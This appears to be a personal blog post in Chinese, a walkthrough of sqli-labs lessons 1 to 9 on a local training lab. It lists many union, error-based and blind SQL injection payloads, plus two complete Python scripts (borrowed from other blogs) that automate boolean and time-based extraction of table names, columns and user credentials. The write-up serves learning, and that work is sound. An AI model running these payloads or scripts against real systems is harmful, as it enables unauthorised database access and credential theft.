@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>sqli-labs训练（less1-10） | Scorpio</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="终于完完整整地学完了less1-10，还是学到有丶东西">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs训练（less1-10）">
+<meta property="og:url" content="https://www.Gsuhy.cn/2018/02/05/sqli-labs训练（1-10）/index.html">
+<meta property="og:site_name" content="Scorpio">
+<meta property="og:description" content="终于完完整整地学完了less1-10，还是学到有丶东西">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-08-18T03:30:35.847Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs训练（less1-10）">
+<meta name="twitter:description" content="终于完完整整地学完了less1-10，还是学到有丶东西">
+  
+    <link rel="alternate" href="/atom.xml" title="Scorpio" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Scorpio</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Gsuhy</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://www.Gsuhy.cn"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sqli-labs训练（1-10）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/02/05/sqli-labs训练（1-10）/" class="article-date">
+  <time datetime="2018-02-05T15:04:30.000Z" itemprop="datePublished">2018-02-05</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/SQL/">SQL</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli-labs训练（less1-10）
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>终于完完整整地学完了less1-10，还是学到有丶东西<a id="more"></a></p>
+<h2 id="sqli-lab训练-less1-10"><a href="#sqli-lab训练-less1-10" class="headerlink" title="sqli-lab训练(less1-10)"></a>sqli-lab训练(less1-10)</h2><p>(由于才开始真正的接触sql系统的训练 ，所以写详细一些)</p>
+<h3 id="less1-GET-Error-based-Single-quotes-String"><a href="#less1-GET-Error-based-Single-quotes-String" class="headerlink" title="less1(GET- Error based- Single quotes - String)"></a>less1(GET- Error based- Single quotes - String)</h3><p><strong>基于错误的GET单引号字符型注入</strong>- <code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1</code></p>
+<ul>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=2</code></li>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=1/2</code><br>都是正常<br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</code><br>结果就报错，分析一下：<br><code>&#39;     &#39;   1&#39;   &#39; LIMIT 0,1       &#39;</code><br>最外面的两个单引号是标识错误，1’是输入的，那么1两边的单引号那么应该就是sql语句<br>那么实际在后台的语句应该是<br><code>select username,password from table where id=&#39;input&#39;</code><h5 id="接下来猜字段："><a href="#接下来猜字段：" class="headerlink" title="接下来猜字段："></a>接下来猜字段：</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1‘ order by 4%23&#39;</code><h5 id="union查询："><a href="#union查询：" class="headerlink" title="-union查询："></a>-union查询：</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; union select 1,2,3%23</code>这里都是正常的？？？<br>看下源码，其中发现<code>mysql_fetch_array</code>只被调用了一次，而<code>mysql_fetch_array</code>从结果集中取得一行作为关联数字或者数字数组或两个一起，所以这里无论怎么搞都只会出来第一行的查询结果，那么只要让第一行查询结果为空就行</li>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=0‘ union select 1,2,3%23&#39;</code>，可以看到第二列和第三列的结果显示在页面上了，不过我这里和教程上面有些不同，并没有提示<code>your sql.........</code>，不知道为什么。<h5 id="接下里就是爆数据库："><a href="#接下里就是爆数据库：" class="headerlink" title="接下里就是爆数据库："></a>接下里就是爆数据库：</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,database(),3%23</code>–得到security<h5 id="在CSDN上看到还有一种方法爆出了所有的数据库"><a href="#在CSDN上看到还有一种方法爆出了所有的数据库" class="headerlink" title="在CSDN上看到还有一种方法爆出了所有的数据库"></a>在CSDN上看到还有一种方法爆出了所有的数据库</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,group_concat(SCHEMA_NAME),3
+from information_schema.SCHEMATA%23</code>,不过目前好像只适合less1.。。。。。<h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,group_concat(TABLE_NAME),3 from information_schema.TABLES where TABLE_SCHEMA=&#39;security&#39;%23</code><h5 id="爆字段名"><a href="#爆字段名" class="headerlink" title="爆字段名"></a>爆字段名</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,group_concat(COLUMN_NAME),3 from information_schema.COLUMNS where TABLE_NAME = &#39;users&#39; and TABLE_SCHEMA = &#39;Security&#39;%23</code><br>如果这里要精确得查找表的字段名，那么就要加上限定条件<code>TABLE_NAME=&#39;user&#39;/TABLE_SCHEMA=&#39;Security&#39;</code><h5 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h5><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=0&#39; union select 1,group_concat(username),group_concat(password) from users %23</code><h3 id="less2-GET-Error-based-Intiger-based"><a href="#less2-GET-Error-based-Intiger-based" class="headerlink" title="less2(GET-Error based -Intiger based)"></a>less2(GET-Error based -Intiger based)</h3></li>
+</ul>
+<p><strong>基于错误的GET整型注入</strong><br>同样用<code>and 1=1</code>和<code>and 1=2</code>进行测试，结果<code>and 1=2</code>报错了，其实就是跟Less1是一样的，只不过不用闭合单引号。</p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,concat_ws(char(32,58,32),id,database(),password) from  users limit 0,1 %23</code></p>
+<h3 id="less3-GET-Error-based-Single-quotes-with-twist-string"><a href="#less3-GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="less3(GET - Error based - Single quotes with twist string)"></a>less3(GET - Error based - Single quotes with twist string)</h3><p><strong>基于错误的GET单引号变形字符型注入</strong><br>还是一样加个单引号先测一下<code>?id=1&#39;</code>报错，分析一下报错语句<br><code>&#39;     &#39;   1&#39;   &#39;) LIMIT 0,1     &#39; at line 1</code>多了一个），就想到应该是有一个（在起作用，那就需要把（闭合应该就行了<br><code>?id=1&#39;) and (&#39;1&#39; = &#39;1</code>/<code>?id=1&#39;) and 1=1 --+</code>，闭合或者注释之后看到就正常了。<br>看一下源码就是这样的<code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></p>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1%27) union select 1,2,concat_ws(char(32,58,32),id,username,password) from  users limit 6,1 --+</code></p>
+<h3 id="less4-GET-–-Error-based-–-Double-Quotes-–-String"><a href="#less4-GET-–-Error-based-–-Double-Quotes-–-String" class="headerlink" title="less4(GET – Error based – Double Quotes – String)"></a>less4(GET – Error based – Double Quotes – String)</h3><p><strong>基于GET双引号字符型注入</strong><br>PHP中双引号可以包含单引号，所以先直接<code>?id=1&#39;</code>，没有报错，1=1和1=2都没有报错，<code>?id=1&quot;</code>报错：<code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code>，发现居然还有个括号，我构造了一下<code>?id=1&quot;) and 1=1 --+</code>正常，但是1=2就报错</p>
+<ul>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; --+</code>就爆出了第一个表emails<br>要爆出其他表就加个<code>limit *,1</code>即可<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5></li>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code></li>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></li>
+<li><code>http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,group_concat(username,password),3 from users --+</code><h3 id="less5-GET-–-Double-Injection-–-Single-Quotes-–-String"><a href="#less5-GET-–-Double-Injection-–-Single-Quotes-–-String" class="headerlink" title="less5(GET – Double Injection – Single Quotes – String)"></a>less5(GET – Double Injection – Single Quotes – String)</h3></li>
+</ul>
+<p><strong>双注入GET单引号字符型注入</strong></p>
+<h4 id="基于错误的sql语句构造"><a href="#基于错误的sql语句构造" class="headerlink" title="基于错误的sql语句构造"></a>基于错误的sql语句构造</h4><h5 id="几个比较重要的函数"><a href="#几个比较重要的函数" class="headerlink" title="几个比较重要的函数"></a>几个比较重要的函数</h5><ul>
+<li>count():统计元组的个数</li>
+<li>rand():产生一个0-1的随机数</li>
+<li>floor():向下取整</li>
+<li>group by:根据规则对结果进行分组<br>count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h5></li>
+</ul>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;emails&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select email_id from emails limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a%23  
+
+Or
+
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1&#39; and(select 1 from(select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)a) --+
+
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1&#39; and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database(),limit0,1),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)a) --+
+
+
+http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(select password from users limit 2,1),0x3a,0x3a,floor(rand()*2)) name from information_schema.tables group by name)b) --+</code></pre><p>还有好多种方法</p>
+<h5 id="使用extractvalue"><a href="#使用extractvalue" class="headerlink" title="使用extractvalue:"></a>使用extractvalue:</h5><p>extractvalue(xml_frag,xpath_expr)<br>extractvalue()接受两个字符串参数，一个xml标记xml_frag的片段和一个xpath表达式xpath_expr(也称为定位符)</p>
+<p>#####payload:</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1&#39; and 1=extractvalue(1,concat(0x5e24,(select user()))) --+</code></pre><p>#####使用updatexml:updatexml(xml_target,xpath_expr,new_xml)<br>此函数用新的xml片段new_xml替换xml标记xml_target的给定片段的单个部分，然后返回更改的xml。被替换的xml_target的部分与用户提供的xpath表达式xpath_expr匹配</p>
+<h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1&#39; and 1=updatexml(1,concat(0x5e24,(select database())),1) --+</code></pre><p>-name_const:name_const(name,value)<br>用于生成结果时，name_const()会使列具有给定的名称<br>payload:</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-5/
+?id=1&#39; and 1=(select * from (select name_const(version(),1),name_const(version(),1))b) --+</code></pre><h3 id="less6-GET-–-Double-Injection-–-Double-Quotes-–-String"><a href="#less6-GET-–-Double-Injection-–-Double-Quotes-–-String" class="headerlink" title="less6(GET – Double Injection – Double Quotes – String)"></a>less6(GET – Double Injection – Double Quotes – String)</h3><p>跟less5差不多，只是把单引号换成双引号就行</p>
+<h3 id="less7-GET-–-Dump-into-outfile-–-String"><a href="#less7-GET-–-Dump-into-outfile-–-String" class="headerlink" title="less7(GET – Dump into outfile – String)"></a>less7(GET – Dump into outfile – String)</h3><p><strong>导出文件GET字符型注入</strong><br>先说几个函数</p>
+<h5 id="outfile函数："><a href="#outfile函数：" class="headerlink" title="outfile函数："></a>outfile函数：</h5><p><code>select...into outfile</code>语句可以将表的内容导出为一个文本文件<br><code>select * from users into outfile &#39;路径&#39;;</code></p>
+<h5 id="dumpfile"><a href="#dumpfile" class="headerlink" title="dumpfile:"></a>dumpfile:</h5><p>与outfile相似，只不过一次只导出一行<br><code>select * from users limit 0,1 into outfile &#39;路径&#39;;</code></p>
+<h5 id="load-file"><a href="#load-file" class="headerlink" title="load_file:"></a>load_file:</h5><p>将数据导入mysql然后回到题目，先测试，测来测去，发现有<code>?id=1&#39;</code>、<code>?id=1&#39;)</code>都是报错，但是<code>?id=1&#39;))</code>是正常的</p>
+<h5 id="猜字段嘛"><a href="#猜字段嘛" class="headerlink" title="猜字段嘛"></a>猜字段嘛</h5><p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) order by 3 --+</code></p>
+<h5 id="查询嘛"><a href="#查询嘛" class="headerlink" title="查询嘛"></a>查询嘛</h5><p><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,3 --+</code></p>
+<h5 id="权限测试"><a href="#权限测试" class="headerlink" title="权限测试"></a>权限测试</h5><p><code>and (select count(*) from mysql.user)&gt;0 --+</code></p>
+<h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><pre><code>http://127.0.0.1/sqli-labs-master/Less-7/?id=1&#39;)) union select 1,2,3 into outfile &#39;路径、1.txt&#39; --+‘</code></pre><h3 id="less8-GET-–-Blind-–-Boolian-Based-–-Single-Quotes"><a href="#less8-GET-–-Blind-–-Boolian-Based-–-Single-Quotes" class="headerlink" title="less8(GET – Blind – Boolian Based – Single Quotes)"></a>less8(GET – Blind – Boolian Based – Single Quotes)</h3><p><strong>基于布尔盲注</strong></p>
+<h4 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h4><ul>
+<li>length():返回字符串长度<br><code>select length(database())</code></li>
+<li>substr():截取字符串<br><code>select substr(database(),1,1)</code></li>
+<li>ascii():返回字符的ascii码<br><code>select ascii(substr(database(),2,1))</code></li>
+</ul>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39;</code></pre><p>报错</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and 1=1--+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and (ascii(substr(database(),1,1)))&gt;100 --+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and (ascii(substr(database(),1,1)))&gt;115 --+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and (ascii(substr(database(),1,1)))&lt;117 --+
+
+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and (ascii(substr(database(),1,1)))=115 --+</code></pre><p>不过这样一个一个试也太慢了吧，不如来一个python脚本跑一蛤，这么厉害的脚本肯定不是来自目前的我，来自CSDN上一篇博客，并且这个脚本只有在2.7版本才能跑，在3.6就跑不了。</p>
+<pre><code># -*-coding:utf-8-*-  
+
+import urllib  
+import urllib2  
+
+getTable = &quot;users&quot;  
+success_str = &quot;You are in&quot;  
+
+index = &quot;0&quot;  
+url = &quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&quot;  
+database = &quot;database()&quot;  
+selectDB = &quot;select database()&quot;  
+selectTable = &quot;select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1&quot;  
+
+asciiPayload = &quot;&#39; and ascii(substr((%s),%d,1))&gt;=%d #&quot;  
+lengthPayload = &quot;&#39; and length(%s)&gt;=%d #&quot;  
+selectTableCountPayload = &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d #&quot;  
+
+selectTableNameLengthPayloadfront = &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;  
+selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;  
+
+#发送请求,根据页面的返回的判断长度的猜测结果  
+#string:猜测的字符串;payload:使用的payload;length:猜测的长度  
+def getLengthResult(payload, string, length):  
+    finalUrl = url + urllib.quote(payload % (string, length))  
+    res = urllib2.urlopen(finalUrl)  
+    if success_str in res.read():  
+        return True  
+    else:  
+        return False  
+
+#发送请求,根据页面的返回的判断字符的猜测结果  
+#payload:使用的payload;string:猜测的字符串;pos:猜测字符串的位置;ascii:猜测的ascii  
+def getResult(payload, string, pos, ascii):  
+    finalUrl = url + urllib.quote(payload % (string, pos, ascii))  
+    res = urllib2.urlopen(finalUrl)  
+    if success_str in res.read():  
+        return True  
+    else:  
+        return False  
+
+#注入  
+def inject():  
+    #猜数据库长度  
+    lengthOfDBName = getLengthOfString(lengthPayload, database)  
+    print &quot;length of DBname:&quot; + str(lengthOfDBName)  
+    #猜数据库名称  
+    DBname = getName(asciiPayload, selectDB, lengthOfDBName)  
+    print &quot;current database:&quot; + DBname  
+    #猜数据库中的表的个数  
+    tableCount = getLengthOfString(selectTableCountPayload, DBname)  
+    print &quot;count of talbe:&quot; + str(tableCount)  
+    for i in xrange(0, tableCount):  
+        num = str(i)  
+        #猜当前表的长度  
+        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind  
+        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)  
+        print &quot;current table length:&quot; + str(tableNameLength)  
+        #猜当前表的名字  
+        selectTableName = selectTable % (DBname, i)  
+        tableName = getName(asciiPayload, selectTableName, tableNameLength)  
+        print tableName  
+    selectColumnCountPayload = &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d #&quot;  
+    #猜指定表的列的数量  
+    columnCount = getLengthOfString(selectColumnCountPayload, getTable)  
+    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)  
+    #猜该表有多少行数据  
+    dataCountPayload = &quot;&#39;and (select count(*) from %s)&gt;=%d #&quot;  
+    dataCount = getLengthOfString(dataCountPayload, getTable)  
+    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)  
+    data = []  
+    #获取指定表中的列  
+    for i in xrange(0, columnCount):  
+        #猜列名长度  
+        selectColumnNameLengthPayload = &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(  
+            i) + &quot;,1)&gt;=%d #&quot;  
+        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)  
+        print &quot;current column length:&quot; + str(columnNameLength)  
+        #猜列的名字  
+        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1&quot;  
+        selectColumnName = selectColumn % (getTable, i)  
+        columnName = getName(asciiPayload, selectColumnName, columnNameLength)  
+        print columnName  
+        tmpData = []  
+        tmpData.append(columnName)  
+        #获取该表的数据  
+        for j in xrange(0, dataCount):  
+            columnDataLengthPayload = &quot;&#39;and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;  
+            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)  
+            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;  
+            columnData = getName(asciiPayload, selectData, columnDataLength)  
+            tmpData.append(columnData)  
+        data.append(tmpData)  
+    #格式化输出数据  
+    tmp = &quot;&quot;  
+    for i in xrange(0, len(data)):  
+        tmp += data[i][0] + &quot;   &quot;  
+    print tmp  
+    for j in xrange(1, dataCount + 1):  
+        tmp = &quot;&quot;  
+        for i in xrange(0, len(data)):  
+            tmp += data[i][j] + &quot;   &quot;  
+        print tmp  
+
+#猜长度  
+def getLengthOfString(payload, string):  
+    lengthLeft = 0  
+    lengthRigth = 0  
+    guess = 10  
+    #确定长度上限,每次增加5  
+    while 1:  
+        if getLengthResult(payload, string, guess) == True:  
+            guess = guess + 5  
+        else:  
+            lengthRigth = guess  
+            break;  
+    #二分法查长度  
+    mid = (lengthLeft + lengthRigth) / 2  
+    while lengthLeft &lt; lengthRigth - 1:  
+        if getLengthResult(payload, string, mid) == True:  
+            lengthLeft = mid  
+        else:  
+            lengthRigth = mid  
+        mid = (lengthLeft + lengthRigth) / 2  
+    return lengthLeft  
+
+#猜名字  
+def getName(payload, string, lengthOfString):  
+    #空格(32)是第一个可显示的字符delete(127)是最后一个可显示的字符  
+    tmp = &#39;&#39;  
+    for i in xrange(1, lengthOfString + 1):  
+        left = 32  
+        right = 127  
+        mid = (left + right) / 2  
+        while left &lt; right - 1:  
+            if getResult(payload, string, i, mid) == True:  
+                left = mid  
+                mid = (left + right) / 2  
+            else:  
+                right = mid  
+            mid = (left + right) / 2  
+        tmp += chr(left)  
+    return tmp
+def main():
+      inject()
+main()</code></pre><h3 id="less9-GET-–-Blind-–-Time-based-–-Single-Quotes"><a href="#less9-GET-–-Blind-–-Time-based-–-Single-Quotes" class="headerlink" title="less9(GET – Blind – Time based – Single Quotes)"></a>less9(GET – Blind – Time based – Single Quotes)</h3><p><strong>基于时间-单引号-盲注</strong><br>测试发现有没有单引号都是返回的<code>you are in......</code>，不管输入啥都是一样的<br>管他的，脚本跑…….，脚本代码来自freebuf上一篇文章</p>
+<pre><code>#-*-coding:utf-8-*-
+
+import time
+import urllib
+import urllib2
+
+index = &quot;0&quot;
+getTable = &quot;users&quot;
+url = &quot;http://127.0.0.1/sqli-labs-master/Less-8/?id=1&quot;
+database = &quot;database()&quot;
+selectDB = &quot;(select database())&quot;
+selectTable = &quot;(select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1)&quot;
+asciiPayload = &quot;&#39; and if(ascii(substr(%s,%d,1))&gt;=%d,0,sleep(0.1)) #&quot;
+lengthPayload = &quot;&#39; and if(length(%s)&gt;=%d,0,sleep(0.1)) #&quot;
+selectTableCountPayload = &quot;&#39; and if((select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d,0,sleep(0.1)) #&quot;
+selectTableNameLengthPayloadfront = &quot;&#39;and if((select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;
+selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d,0,sleep(0.1)) #&quot;
+
+#发送请求,根据页面的返回时间的判断长度的猜测结果
+#string:猜测的字符串;payload:使用的payload;length:猜测的长度
+def getLengthResult(payload, string, length):
+    print payload % (string, length)
+    finalUrl = url + urllib.quote(payload % (string, length))
+    s1=time.time()
+    res = urllib2.urlopen(finalUrl)
+    s2=time.time()
+    if s2-s1 &lt; 0.08:
+        return True
+    else:
+        return False
+
+#发送请求,根据页面的返回时间的判断字符的猜测结果
+#payload:使用的payload;string:猜测的字符串;pos:猜测字符串的位置;ascii:猜测的ascii
+def getResult(payload, string, pos, ascii):
+    finalUrl = url + urllib.quote(payload % (string, pos, ascii))
+    s1 = time.time()
+    res = urllib2.urlopen(finalUrl)
+    s2 = time.time()
+    if s2 - s1 &lt; 0.08:
+        return True
+    else:
+        return False
+
+#注入
+def inject():
+    #猜数据库长度
+    lengthOfDBName = getLengthOfString(lengthPayload, database)
+    print &quot;length of DBname: &quot; + str(lengthOfDBName)
+    #猜数据库名称
+    DBname = getName(asciiPayload, selectDB, lengthOfDBName)
+    print &quot;current database:&quot; + DBname
+    #猜数据库中的表的个数
+    tableCount = getLengthOfString(selectTableCountPayload, DBname)
+    print &quot;count of table:&quot; + str(tableCount)
+    for i in xrange(0, tableCount):
+        num = str(i)
+        #猜当前表的长度
+        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind
+        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)
+        print &quot;current table length:&quot; + str(tableNameLength)
+        #猜当前表的名字
+        selectTableName = selectTable % (DBname, i)
+        tableName = getName(asciiPayload, selectTableName, tableNameLength)
+        print tableName
+    #猜指定表的列的数量
+    selectColumnCountPayload =&quot;&#39; and if((select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d,0,sleep(0.1)) #&quot;
+    columnCount = getLengthOfString(selectColumnCountPayload, getTable)
+    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)
+    #猜该表有多少行数据
+    dataCountPayload = &quot;&#39; and if((select count(*) from %s)&gt;=%d,0,sleep(0.1)) #&quot;
+    dataCount = getLengthOfString(dataCountPayload, getTable)
+    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)
+    data = []
+    #获取指定表中的列
+    for i in xrange(0, columnCount):
+        #猜该列名字长度
+        selectColumnNameLengthPayload = &quot;&#39; and if((select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(i) + &quot;,1)&gt;=%d,0,sleep(0.1)) #&quot;
+        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)
+        print &quot;current column length:&quot; + str(columnNameLength)
+        #猜该列的名字
+        selectColumn = &quot;(select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1)&quot;
+        selectColumnName = selectColumn % (getTable, i)
+        columnName = getName(asciiPayload, selectColumnName, columnNameLength)
+        print columnName
+        tmpData = []
+        tmpData.append(columnName)
+        #获取该表的数据
+        for j in xrange(0, dataCount):
+            columnDataLengthPayload = &quot;&#39; and if((select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d,0,sleep(0.1)) #&quot;
+            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)
+            selectData = &quot;(select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1)&quot;
+            columnData = getName(asciiPayload, selectData, columnDataLength)
+            tmpData.append(columnData)
+        data.append(tmpData)
+        #格式化输出数据
+    tmp = &quot;&quot;
+    for i in xrange(0, len(data)):
+        tmp += data[i][0] + &quot;   &quot;
+    print tmp
+    for j in xrange(1, dataCount + 1):
+        tmp = &quot;&quot;
+        for i in xrange(0, len(data)):
+            tmp += data[i][j] + &quot;   &quot;
+        print tmp
+
+#猜长度
+def getLengthOfString(payload, string):
+    lengthLeft = 0
+    lengthRigth = 0
+    guess = 10
+    #确定长度上限,每次增加5
+    while 1:
+        if getLengthResult(payload, string, guess) == True:
+            guess = guess + 5
+        else:
+            lengthRigth = guess
+            break;
+    #二分法查长度
+    mid = (lengthLeft + lengthRigth) / 2
+    while lengthLeft &lt; lengthRigth - 1:
+        if getLengthResult(payload, string, mid) == True:
+            lengthLeft = mid
+        else:
+            lengthRigth = mid
+        mid = (lengthLeft + lengthRigth) / 2
+    return lengthLeft
+
+#猜名字
+def getName(payload, string, lengthOfString):
+    #空格(32)是第一个可显示的字符delete(127)是最后一个可显示的字符
+    tmp = &#39;&#39;
+    for i in xrange(1, lengthOfString + 1):
+        left = 32
+        right = 127
+        mid = (left + right) / 2
+        while left &lt; right - 1:
+            if getResult(payload, string, i, mid) == True:
+                left = mid
+                mid = (left + right) / 2
+            else:
+                right = mid
+            mid = (left + right) / 2
+        tmp += chr(left)
+    return tmp
+
+def main():
+    inject()
